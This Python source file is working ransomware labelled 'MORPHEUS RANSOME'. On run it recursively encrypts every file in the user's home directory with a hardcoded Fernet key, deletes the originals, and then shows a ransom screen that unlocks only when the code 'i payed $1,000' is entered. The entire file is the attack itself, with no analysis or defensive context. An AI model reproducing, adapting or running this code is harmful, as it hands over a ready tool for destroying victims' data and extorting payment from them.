import os
import ctypes
from cryptography.fernet import Fernet
from colorama import Fore

user = os.getlogin()
bleed = f""
path = os.path.join(os.path.expanduser("~"), bleed)


def search_2_encrypt(target):
        try:
                entries = os.listdir(target)
        except PermissionError:
                print("Permission denied:", target)
                return
        files = [f for f in entries if os.path.isfile(os.path.join(target, f)) if not f.endswith(".encrypted")]
        directories = [d for d in entries if os.path.isdir(os.path.join(target, d))]
        key = "LUeFFZC8780e9IPps_FzpGYLE3uqc9uTWxjlF1vHASE="
        fernet = Fernet(key)
        for file in files:
                full_path = os.path.join(target, file)
                with open(full_path, "rb") as f:
                        file_data = f.read()
                encrypted_data = fernet.encrypt(file_data)
                with open(full_path + ".encrypted", "wb") as f:
                        f.write(encrypted_data)
                os.remove(full_path)
        for directory in directories:
                new_target = os.path.join(target, directory)
                search_2_encrypt(new_target)


def search_2_decrypt(target):
        try:
                entries = os.listdir(target)
        except PermissionError:
                print("Permission denied:", target)
                return
        files = [f for f in entries if os.path.isfile(os.path.join(target, f)) if f.endswith(".encrypted")]
        directories = [d for d in entries if os.path.isdir(os.path.join(target, d))]
        key = "LUeFFZC8780e9IPps_FzpGYLE3uqc9uTWxjlF1vHASE="
        fernet = Fernet(key)
        for file in files:
                full_path = os.path.join(target, file)
                with open(full_path, "rb") as f:
                        file_data = f.read()
                decrypted_data = fernet.decrypt(file_data)
                with open(full_path, "wb") as f:
                        f.write(decrypted_data)
                name_part, extension_part = os.path.splitext(file)
                new_file = os.path.join(target, name_part)
                os.rename(full_path, new_file)
        for directory in directories:
                new_target = os.path.join(target, directory)
                search_2_decrypt(new_target)



def code_entry():
        if input(Fore.LIGHTRED_EX + "(CODE) " + Fore.RESET) == "i payed $1,000":
                print(Fore.LIGHTGREEN_EX + "Files Unlocking..." + Fore.RESET)
                search_2_decrypt(path)
        else:
                print("Incorrect CODE, try again.")
                code_entry()
                return


def frame():
        search_2_encrypt(path)
        print(Fore.LIGHTRED_EX + """
        MORPHEUS RANSOME                                                           

  Your files have been LOCKED!
  To recover your data, enter the correct CODE:
    """ + Fore.RESET)
        code_entry()


frame()